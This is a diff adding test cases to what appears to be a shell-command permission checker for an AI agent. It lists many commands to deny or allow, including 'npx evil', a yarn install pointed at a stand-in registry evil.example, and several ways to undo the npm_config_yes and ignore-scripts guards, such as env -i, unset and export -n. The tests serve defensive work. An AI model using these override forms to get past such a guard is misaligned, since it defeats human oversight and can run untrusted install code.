@@ -88,6 +88,37 @@ for (const cmd of [
   "pnpm --filter=web install",
   "pnpm -w add evil",
   "npm --workspace web install evil",
+  // Bare yarn behind a value-taking global option is still yarn's default command
+  // (install): the option's value is not a script name.
+  "yarn --cwd sub",
+  "yarn --cwd sub --frozen-lockfile",
+  "yarn --network-timeout 100000",
+  "yarn --modules-folder nm",
+  "yarn --cache-folder /tmp/c --mutex network",
+  "yarn --registry https://evil.example 2>&1",
+  "yarn --production",
+  "yarn --prod true",
+  "yarn --emoji false --cwd sub",
+  "yarn --modules-folder nm add evil",
+  "yarn --network-timeout 100000 upgrade",
+  "yarn --cwd sub create vite",
+  // Switching off the npm_config_yes=false guard is `npx -y` (npm assumes --yes when
+  // stdin is not a TTY), so every override form is refused.
+  "npm_config_yes=true npx evil",
+  "NPM_CONFIG_YES=true npx evil",
+  "export npm_config_yes=true; npx evil",
+  "env npm_config_yes=1 npm exec evil",
+  "env -u npm_config_yes npx evil",
+  "env -unpm_config_yes npx evil",
+  "unset npm_config_yes; npx evil",
+  "unset -v npm_config_yes && npm exec evil",
+  "export -n npm_config_yes; npx evil",
+  "declare +x npm_config_yes; npx evil",
+  "env -i npx evil",
+  "env - npx evil",
+  "/usr/bin/env -i PATH=/usr/bin npx evil",
+  "env --ignore-environment npm exec evil",
+  "unset -v npm_config_ignore_scripts; npm run build",
 ]) {
   t.deny(`normal tick: ${cmd}`, bash(cmd), normal);
 }
@@ -120,6 +151,14 @@ for (const cmd of [
   "npm -w create test",
   "yarn --cwd x build",
   "bun --cwd app test",
+  // A value-taking yarn option followed by a script name is a script run.
+  "yarn --cwd sub build",
+  "yarn --network-timeout 100000 test",
+  "yarn --modules-folder nm run lint",
+  "yarn --emoji false test",
+  // Reading the guard and env -i without a package manager are not overrides.
+  "env -i node test.js",
+  "echo $npm_config_yes",
 ]) {
   t.allow(`normal tick: ${cmd}`, bash(cmd), normal);
 }
@@ -175,6 +214,12 @@ for (const cmd of [
   "pnpm add --ignore-scripts '--config.global-dir=/tmp' evil",
   "npm install '--ignore-scripts=false'",
   "cd ~ && npm install --ignore-scripts",
+  // The space-separated --cwd is an install relocated outside (was allowed: the
+  // segment was never classified as an install, so the dir check never ran).
+  "yarn --cwd /tmp --ignore-scripts",
+  `yarn --cwd ${OUT} --ignore-scripts`,
+  `yarn --modules-folder ${OUT}/nm --ignore-scripts`,
+  "npm_config_yes=true npx evil",
 ]) {
   t.deny(`bootstrap: ${cmd}`, bash(cmd), boot);
 }
@@ -192,6 +237,8 @@ for (const cmd of [
   "pnpm add -D vitest --ignore-scripts",
   "npm install --ignore-scripts --prefix=./sub",
   "pnpm add --ignore-scripts --global-dir ./sub/g x",
+  "yarn --cwd sub --ignore-scripts",
+  "yarn --cwd=sub --ignore-scripts",
 ]) {
   t.allow(`bootstrap: ${cmd}`, bash(cmd), boot);
 }
